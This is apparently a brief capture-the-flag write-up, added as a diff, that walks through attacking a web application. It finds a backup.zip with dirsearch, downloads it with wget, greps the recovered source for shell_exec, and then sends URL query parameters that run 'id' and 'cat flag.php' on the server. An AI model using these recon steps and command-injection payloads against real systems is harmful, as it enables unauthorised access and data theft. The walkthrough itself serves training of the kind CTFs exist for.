@@ -1,0 +1,14 @@
+dirsearch - u url
+After performing some recon using dirsearch on the targeted web application, we can find a backup.zip archive.
+
+wget http://{url}//backup.zip 
+
+Download the backup file from the following url
+
+In this way, we obtain the source code of the application
+
+$ grep –r “shell_exec(“
+
+
+{url}/?welldone=knockknock&knock&shazam=id
+{url}/?welldone=knockknock&knock&shazam=cat flag.php
